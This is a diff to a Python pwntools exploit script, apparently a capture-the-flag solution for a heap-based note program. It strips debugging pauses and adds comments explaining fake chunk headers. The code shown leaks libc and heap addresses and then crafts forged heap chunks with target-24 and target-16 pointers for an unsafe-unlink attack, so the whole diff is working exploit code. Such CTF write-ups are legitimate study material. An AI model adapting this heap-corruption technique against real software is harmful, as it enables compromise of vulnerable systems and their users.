@@ -114,17 +114,11 @@ if __name__ == "__main__":
     leaked_libc = leak_libc() 
     libc_base = leaked_libc - (0x7f8f01ab8b78 - 0x7f8f016f4000)
 
-    raw_input('after leaking libc...')
-
     delete_note(0)
     delete_note(1)
     
-    raw_input('after cleanup...')
-
     for _ in xrange(4):
         new_note(p32(0xcafebabe))
-
-    raw_input("after malloc four 0xcafebabe's...")
 
     #
     # don't free adjacent chunks!!! it will cause heap coalescing.
@@ -134,18 +128,12 @@ if __name__ == "__main__":
     delete_note(2) # basically, the order is not important.
     delete_note(0)
     
-    raw_input('after 2 frees...')
-
     new_note('D'*8)
     leaked_heap = leak_heap()
     
-    raw_input('after leaking heap...')
-
     delete_note(0)
     delete_note(1)
     delete_note(3)
-
-    raw_input('after another cleanup...')
 
     #
     # Step 1)
@@ -155,15 +143,11 @@ if __name__ == "__main__":
 
     new_note('A'*0x80)
     new_note('B'*0x80)
-    new_note('B'*0x80)
+    new_note('C'*0x80)
     
-    raw_input('after alloc two chunks...')
-
     delete_note(0)
     delete_note(1)
     delete_note(2)
-
-    raw_input('after free two chunks...')
 
     #
     # Step 2)
@@ -191,8 +175,8 @@ if __name__ == "__main__":
     log.info('chunk_1: 0x%x' % (leaked_heap+16+0x80))
 
     chunk_0 = p64(0) + p64(8) + p64(target-24) + p64(target-16) + 'A'*(0x80-32)
-    chunk_1 = p64(0x80) + p64(0x90) + 'B'*0x80
-    chunk_2 = p64(0) + p64(0x91) + 'C'*0x80
+    chunk_1 = p64(0x80) + p64(0x90) + 'B'*0x80 # prev_size = 0x80, PREV_INUSE = 0
+    chunk_2 = p64(0) + p64(0x91) + 'C'*0x80 # PREV_INUSE = 1
 
     payload_len = len(chunk_0 + chunk_1 + chunk_2)
 
